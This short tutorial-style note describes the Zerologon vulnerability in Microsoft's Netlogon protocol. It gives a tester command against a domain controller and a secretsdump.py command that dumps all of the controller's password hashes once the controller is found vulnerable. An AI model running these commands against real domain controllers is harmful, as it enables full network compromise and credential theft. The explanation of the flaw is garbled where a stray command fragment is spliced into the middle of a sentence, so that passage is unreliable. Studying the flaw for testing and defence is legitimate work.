Zerologon (CVE-2020-1472) is a critical vulnerability in Microsoft's Netlogon Remote Protocol (MS-NRPC), disclosed in August 2020. It allows an unauthenticated attacker to take over a domain controller in Active Directory environments, enabling a complete compromise of the entire network. Here’s a brief overview:
How Zerologon Works:

1- The flaw exists in the Netlogon Remote Protocol, which is used to authenticate users and computers to domain controllers.<br>
2- Due to a flaw in the cryptographic implementation, an attacker can manipulate authentication exchanges by sending specially crafted packets with all-zerzerologon_tester.py EXAMPLE-DC 1.2.3.4o initialization vectors.<br>
3- With this, the attacker can impersonate any computer, including the domain controller, and reset the domain controller’s machine account password to an empty string.<br>

We can test if the target vuln or not:
```
python3 zerologon_tester.py <Dc name> <DC ip>
Performing authentication attempts...
============================
Success! DC can be fully compromised by a Zerologon attack.
```
The DC name should be its **NetBIOS** computer name. If this name is not correct, the script will likely fail with a ```STATUS_INVALID_COMPUTER_NAME``` error.<br>
If vulnarable we could dump all the DC hashes:
```
secretsdump.py -just-dc 'DC name$'@<DC ip>
```


